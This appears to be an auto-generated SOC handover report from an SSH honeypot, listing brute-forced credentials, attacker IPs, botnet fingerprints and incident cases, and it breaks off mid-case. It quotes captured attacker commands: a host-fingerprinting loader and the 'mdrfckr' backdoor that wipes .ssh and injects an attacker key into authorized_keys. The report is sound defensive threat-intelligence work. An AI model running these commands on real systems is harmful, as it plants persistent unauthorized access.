# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-16 |
| **Generated At** | 2026-08-16T18:35:31Z |
| **Shift Time** | 18:35 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **4325** |
| Confirmed Threats | **4297** |
| False Positives Filtered | **28** (0.7%) |
| Unique Attacker IPs | **74** |
| Countries of Origin | **35** |
| High Severity Cases | **72** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **4253** |
| Malware Samples Analyzed | **2** HIGH · **23** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **90** |
| Unique Credential Pairs | **47** |
| Unique Usernames | **16** |
| Unique Passwords | **44** |
| Successful Auth Pairs | **81** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 24 |
| `support` | 11 |
| `postgres` | 7 |
| `test` | 6 |
| `nexthink` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 7 |
| `1234567890` | 6 |
| `raspberry` | 6 |
| `123123123` | 5 |
| `uploader` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `test` | `1234567890` | 6 |
| `nexthink` | `123456` | 6 |
| `nobody` | `raspberry` | 6 |
| `support` | `uploader` | 5 |
| `debian` | `123123123` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `default` | `default123` | `183.233.85.194` | 2026-08-16T14:55:42 |
| `default` | `default123` | `60.174.35.18` | 2026-08-16T14:56:00 |
| `debian` | `123123123` | `10.0.0.73` | 2026-08-16T14:56:09 |
| `postgres` | `Abc123` | `217.165.22.192` | 2026-08-16T14:59:33 |
| `root` | `Passw0rd` | `92.118.39.71` | 2026-08-16T15:03:08 |
| `ubuntu` | `9ol.0p` | `185.74.59.14` | 2026-08-16T15:04:37 |
| `test3` | `test3` | `10.0.0.73` | 2026-08-16T15:11:52 |
| `test3` | `test3` | `220.128.137.164` | 2026-08-16T15:13:34 |
| `root` | `Zxcv@1234` | `45.142.193.164` | 2026-08-16T15:14:07 |
| `debian` | `123123123` | `187.126.105.42` | 2026-08-16T15:14:39 |
| `debian` | `123123123` | `58.245.210.70` | 2026-08-16T15:14:58 |
| `test` | `1234567890` | `121.202.206.119` | 2026-08-16T15:14:58 |
| `test` | `1234567890` | `78.189.17.35` | 2026-08-16T15:15:07 |
| `ubuntu` | `qweasdzxc123!@#` | `185.74.59.14` | 2026-08-16T15:16:43 |
| `postgres` | `Abc1234` | `217.165.22.192` | 2026-08-16T15:18:39 |
| `test` | `1234567890` | `10.0.0.73` | 2026-08-16T15:26:24 |
| `test3` | `test3` | `49.124.153.9` | 2026-08-16T15:29:55 |
| `nexthink` | `123456` | `10.0.0.73` | 2026-08-16T15:30:11 |
| `root` | `owner` | `77.90.185.20` | 2026-08-16T15:35:51 |
| `root` | `Aa1234567890` | `45.142.193.164` | 2026-08-16T15:35:54 |
| `postgres` | `ABCabc123` | `217.165.22.192` | 2026-08-16T15:37:46 |
| `test` | `1234567890` | `122.165.72.15` | 2026-08-16T15:43:45 |
| `test` | `1234567890` | `113.193.187.154` | 2026-08-16T15:43:54 |
| `user` | `q1w2e3r4t5y6` | `10.0.0.73` | 2026-08-16T15:46:09 |
| `user` | `q1w2e3r4t5y6` | `117.241.77.78` | 2026-08-16T15:47:47 |
| `user` | `q1w2e3r4t5y6` | `65.20.153.146` | 2026-08-16T15:48:00 |
| `nexthink` | `123456` | `113.200.216.246` | 2026-08-16T15:48:44 |
| `blank` | `123456789` | `195.222.57.190` | 2026-08-16T15:48:48 |
| `nexthink` | `123456` | `62.220.104.155` | 2026-08-16T15:48:49 |
| `nexthink` | `123456` | `178.178.222.59` | 2026-08-16T15:48:52 |
| `blank` | `123456789` | `91.144.158.62` | 2026-08-16T15:48:55 |
| `nexthink` | `123456` | `122.160.142.194` | 2026-08-16T15:49:03 |
| `support` | `support` | `10.0.0.73` | 2026-08-16T15:55:32 |
| `postgres` | `abcd1234` | `217.165.22.192` | 2026-08-16T15:56:53 |
| `root` | `Abc1234567` | `45.142.193.164` | 2026-08-16T15:57:41 |
| `blank` | `123456789` | `10.0.0.73` | 2026-08-16T16:00:30 |
| `user` | `q1w2e3r4t5y6` | `208.109.38.143` | 2026-08-16T16:03:55 |
| `support` | `uploader` | `10.0.0.73` | 2026-08-16T16:04:04 |
| `root` | `Qwert@12345` | `189.190.217.141` | 2026-08-16T16:05:33 |
| `345gs5662d34` | `345gs5662d34` | `189.190.217.141` | 2026-08-16T16:05:35 |
| `root` | `3245gs5662d34` | `189.190.217.141` | 2026-08-16T16:05:36 |
| `root` | `m123456` | `190.6.32.107` | 2026-08-16T16:07:05 |
| `345gs5662d34` | `345gs5662d34` | `190.6.32.107` | 2026-08-16T16:07:07 |
| `root` | `3245gs5662d34` | `190.6.32.107` | 2026-08-16T16:07:08 |
| `admin` | `admin` | `223.85.251.55` | 2026-08-16T16:08:16 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-16T16:08:18 |
| `jenkins` | `q1w2e3r4` | `45.195.221.26` | 2026-08-16T16:09:33 |
| `345gs5662d34` | `345gs5662d34` | `45.195.221.26` | 2026-08-16T16:09:36 |
| `jenkins` | `3245gs5662d34` | `45.195.221.26` | 2026-08-16T16:09:37 |
| `postgres` | `Admin123` | `217.165.22.192` | 2026-08-16T16:15:59 |
| `blank` | `123456789` | `78.189.17.35` | 2026-08-16T16:17:30 |
| `root` | `Aa123321` | `45.142.193.164` | 2026-08-16T16:19:28 |
| `support` | `qwerty123` | `45.178.227.0` | 2026-08-16T16:21:41 |
| `support` | `qwerty123` | `211.253.10.61` | 2026-08-16T16:21:51 |
| `support` | `uploader` | `175.206.1.60` | 2026-08-16T16:22:31 |
| `support` | `uploader` | `61.2.228.177` | 2026-08-16T16:22:40 |
| `nobody` | `raspberry` | `68.7.114.69` | 2026-08-16T16:22:45 |
| `support` | `uploader` | `183.167.217.86` | 2026-08-16T16:22:46 |
| `nobody` | `raspberry` | `65.20.175.6` | 2026-08-16T16:22:53 |
| `support` | `uploader` | `220.80.223.144` | 2026-08-16T16:22:57 |
| `nobody` | `raspberry` | `10.0.0.73` | 2026-08-16T16:34:22 |
| `postgres` | `Huawei12#$` | `217.165.22.192` | 2026-08-16T16:35:06 |
| `root` | `123qwerty` | `92.118.39.71` | 2026-08-16T16:35:23 |
| `support` | `support` | `176.53.159.196` | 2026-08-16T16:36:27 |
| `root` | `21` | `92.118.39.71` | 2026-08-16T16:37:19 |
| `support` | `qwerty123` | `1.247.245.61` | 2026-08-16T16:38:00 |
| `config` | `123123` | `10.0.0.73` | 2026-08-16T16:38:08 |
| `support` | `qwerty123` | `102.90.34.90` | 2026-08-16T16:38:09 |
| `root` | `321` | `92.118.39.71` | 2026-08-16T16:39:15 |
| `root` | `Aa123456789!` | `45.142.193.164` | 2026-08-16T16:39:38 |
| `root` | `4321` | `92.118.39.71` | 2026-08-16T16:41:13 |
| `root` | `54321` | `92.118.39.71` | 2026-08-16T16:43:06 |
| `root` | `P4ssw0rd` | `92.118.39.71` | 2026-08-16T16:44:58 |
| `root` | `P4ssword` | `92.118.39.71` | 2026-08-16T16:46:48 |
| `root` | `P@ssw0rd` | `92.118.39.71` | 2026-08-16T16:48:42 |
| `nobody` | `raspberry` | `14.33.93.214` | 2026-08-16T16:51:22 |
| `nobody` | `raspberry` | `31.173.29.136` | 2026-08-16T16:51:32 |
| `root` | `letmein` | `92.118.39.71` | 2026-08-16T16:52:37 |
| `user` | `123123123` | `10.0.0.73` | 2026-08-16T16:54:05 |
| `postgres` | `Huawei@123` | `217.165.22.192` | 2026-08-16T16:54:13 |
| `root` | `p4ssword` | `92.118.39.71` | 2026-08-16T16:54:39 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **4325** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 33 |
| Go SSH scanner | 32 |
| libssh | 14 |
| Paramiko (Python) | 1 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 33 | 32 |
| `2ec37a7cc8da...` | Mirai/variant | 13 | 1 |
| `f555226df196...` | Mirai/variant | 9 | 3 |
| `e45f2d6d7f79...` | Mirai/variant | 7 | 1 |
| `98ddc5604ef6...` | Modern SSH client | 7 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 33 | 32 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 13 | 1 | Mirai/variant |
| `f555226df196...` | libssh | 9 | 3 | Mirai/variant |
| `e45f2d6d7f79...` | Go SSH scanner | 7 | 1 | Mirai/variant |
| `98ddc5604ef6...` | Go SSH scanner | 7 | 2 | Modern SSH client |
| `95420f9d932d...` | libssh | 4 | 1 | — |
| `16443846184e...` | Go SSH scanner | 3 | 2 | Generic scanner |
| `d6729b7f2442...` | Paramiko (Python) | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 12 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.71`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `45.195.221.26`, `189.190.217.141`, `190.6.32.107`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1h
```
Source IPs: `77.90.185.20`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **74** |
| Unique ASNs | **58** |
| High-Risk ASNs | **45** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4766` | Korea Telecom | 4 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 3 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 2 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS8151` | Uninet S.A. de C.V. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (72)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-84590b4fc15a

| Field | Detail |
|---|---|
| **Source IP** | `183.233.85[.]194` |
| **First Seen** | 2026-08-16 14:55 |
| **Last Seen** | 2026-08-16 14:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 14:55:39` | `cowrie.session.connect` |
| `2026-08-16 14:55:40` | `cowrie.client.version` |
| `2026-08-16 14:55:40` | `cowrie.client.kex` |
| `2026-08-16 14:55:42` | `cowrie.login.success` |
| `2026-08-16 14:55:43` | `cowrie.direct-tcpip.request` |
| `2026-08-16 14:55:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.233.85[.]194` to AbuseIPDB if not already reported
- [ ] Block `183.233.85[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bf8621480b2

| Field | Detail |
|---|---|
| **Source IP** | `60.174.35[.]18` |
| **First Seen** | 2026-08-16 14:55 |
| **Last Seen** | 2026-08-16 14:56 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 14:55:53` | `cowrie.session.connect` |
| `2026-08-16 14:55:56` | `cowrie.client.version` |
| `2026-08-16 14:55:56` | `cowrie.client.kex` |
| `2026-08-16 14:56:00` | `cowrie.login.success` |
| `2026-08-16 14:56:01` | `cowrie.direct-tcpip.request` |
| `2026-08-16 14:56:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.174.35[.]18` to AbuseIPDB if not already reported
- [ ] Block `60.174.35[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04296fff20b9

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 14:59 |
| **Last Seen** | 2026-08-16 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 14:59:32` | `cowrie.session.connect` |
| `2026-08-16 14:59:32` | `cowrie.client.version` |
| `2026-08-16 14:59:32` | `cowrie.client.kex` |
| `2026-08-16 14:59:33` | `cowrie.login.success` |
| `2026-08-16 14:59:33` | `cowrie.session.params` |
| `2026-08-16 14:59:33` | `cowrie.command.input` |
| `2026-08-16 14:59:34` | `cowrie.log.closed` |
| `2026-08-16 14:59:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d2392e27387

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 15:03 |
| **Last Seen** | 2026-08-16 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 15:03:07` | `cowrie.session.connect` |
| `2026-08-16 15:03:07` | `cowrie.client.version` |
| `2026-08-16 15:03:07` | `cowrie.client.kex` |
| `2026-08-16 15:03:08` | `cowrie.login.success` |
| `2026-08-16 15:03:09` | `cowrie.session.params` |
| `2026-08-16 15:03:09` | `cowrie.command.input` |
| `2026-08-16 15:03:09` | `cowrie.command.input` |
| `2026-08-16 15:03:09` | `cowrie.command.input` |
| `2026-08-16 15:03:09` | `cowrie.command.input` |
| `2026-08-16 15:03:09` | `cowrie.command.input` |
| `2026-08-16 15:03:09` | `cowrie.command.success` |
| `2026-08-16 15:03:09` | `cowrie.command.input` |
| `2026-08-16 15:03:09` | `cowrie.command.input` |
| `2026-08-16 15:03:09` | `cowrie.command.input` |
| `2026-08-16 15:03:09` | `cowrie.command.input` |
| `2026-08-16 15:03:09` | `cowrie.log.closed` |
| `2026-08-16 15:03:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc252132d624

| Field | Detail |
|---|---|
| **Source IP** | `185.74.59[.]14` |
| **First Seen** | 2026-08-16 15:04 |
| **Last Seen** | 2026-08-16 15:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 15:04:36` | `cowrie.session.connect` |
| `2026-08-16 15:04:36` | `cowrie.client.version` |
| `2026-08-16 15:04:37` | `cowrie.client.kex` |
| `2026-08-16 15:04:37` | `cowrie.login.success` |
| `2026-08-16 15:04:38` | `cowrie.session.params` |
| `2026-08-16 15:04:38` | `cowrie.command.input` |
| `2026-08-16 15:04:38` | `cowrie.log.closed` |
| `2026-08-16 15:04:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.74.59[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.74.59[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94859b8e310f

| Field | Detail |
|---|---|
| **Source IP** | `220.128.137[.]164` |
| **First Seen** | 2026-08-16 15:13 |
| **Last Seen** | 2026-08-16 15:13 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 15:13:29` | `cowrie.session.connect` |
| `2026-08-16 15:13:31` | `cowrie.client.version` |
| `2026-08-16 15:13:31` | `cowrie.client.kex` |
| `2026-08-16 15:13:34` | `cowrie.login.success` |
| `2026-08-16 15:13:35` | `cowrie.direct-tcpip.request` |
| `2026-08-16 15:13:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.128.137[.]164` to AbuseIPDB if not already reported
- [ ] Block `220.128.137[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bf5d63a2b5e

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-16 15:13 |
| **Last Seen** | 2026-08-16 15:14 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 15:13:39` | `cowrie.session.connect` |
| `2026-08-16 15:13:44` | `cowrie.client.version` |
| `2026-08-16 15:13:44` | `cowrie.client.kex` |
| `2026-08-16 15:14:07` | `cowrie.login.success` |
| `2026-08-16 15:14:20` | `cowrie.session.params` |
| `2026-08-16 15:14:20` | `cowrie.command.input` |
| `2026-08-16 15:14:25` | `cowrie.log.closed` |
| `2026-08-16 15:14:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed9dfc58f9d7

| Field | Detail |
|---|---|
| **Source IP** | `187.126.105[.]42` |
| **First Seen** | 2026-08-16 15:14 |
| **Last Seen** | 2026-08-16 15:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 15:14:36` | `cowrie.session.connect` |
| `2026-08-16 15:14:37` | `cowrie.client.version` |
| `2026-08-16 15:14:37` | `cowrie.client.kex` |
| `2026-08-16 15:14:39` | `cowrie.login.success` |
| `2026-08-16 15:14:39` | `cowrie.direct-tcpip.request` |
| `2026-08-16 15:14:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.126.105[.]42` to AbuseIPDB if not already reported
- [ ] Block `187.126.105[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d97f7686325a

| Field | Detail |
|---|---|
| **Source IP** | `121.202.206[.]119` |
| **First Seen** | 2026-08-16 15:14 |
| **Last Seen** | 2026-08-16 15:15 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 15:14:53` | `cowrie.session.connect` |
| `2026-08-16 15:14:54` | `cowrie.client.version` |
| `2026-08-16 15:14:54` | `cowrie.client.kex` |
| `2026-08-16 15:14:58` | `cowrie.login.success` |
| `2026-08-16 15:14:59` | `cowrie.direct-tcpip.request` |
| `2026-08-16 15:15:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.202.206[.]119` to AbuseIPDB if not already reported
- [ ] Block `121.202.206[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d6fc603b034

| Field | Detail |
|---|---|
| **Source IP** | `58.245.210[.]70` |
| **First Seen** | 2026-08-16 15:14 |
| **Last Seen** | 2026-08-16 15:15 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 15:14:54` | `cowrie.session.connect` |
| `2026-08-16 15:14:55` | `cowrie.client.version` |
| `2026-08-16 15:14:55` | `cowrie.client.kex` |
| `2026-08-16 15:14:58` | `cowrie.login.success` |
| `2026-08-16 15:14:58` | `cowrie.direct-tcpip.request` |
| `2026-08-16 15:15:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.245.210[.]70` to AbuseIPDB if not already reported
- [ ] Block `58.245.210[.]70` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d8248e3024f

| Field | Detail |
|---|---|
| **Source IP** | `78.189.17[.]35` |
| **First Seen** | 2026-08-16 15:15 |
| **Last Seen** | 2026-08-16 15:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 15:15:05` | `cowrie.session.connect` |
| `2026-08-16 15:15:06` | `cowrie.client.version` |
| `2026-08-16 15:15:06` | `cowrie.client.kex` |
| `2026-08-16 15:15:07` | `cowrie.login.success` |
| `2026-08-16 15:15:08` | `cowrie.direct-tcpip.request` |
| `2026-08-16 15:15:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.189.17[.]35` to AbuseIPDB if not already reported
- [ ] Block `78.189.17[.]35` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a05d6836896

| Field | Detail |
|---|---|
| **Source IP** | `185.74.59[.]14` |
| **First Seen** | 2026-08-16 15:16 |
| **Last Seen** | 2026-08-16 15:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 15:16:42` | `cowrie.session.connect` |
| `2026-08-16 15:16:42` | `cowrie.client.version` |
| `2026-08-16 15:16:43` | `cowrie.client.kex` |
| `2026-08-16 15:16:43` | `cowrie.login.success` |
| `2026-08-16 15:16:44` | `cowrie.session.params` |
| `2026-08-16 15:16:44` | `cowrie.command.input` |
| `2026-08-16 15:16:44` | `cowrie.log.closed` |
| `2026-08-16 15:16:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.74.59[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.74.59[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5a392e5877c

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 15:18 |
| **Last Seen** | 2026-08-16 15:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
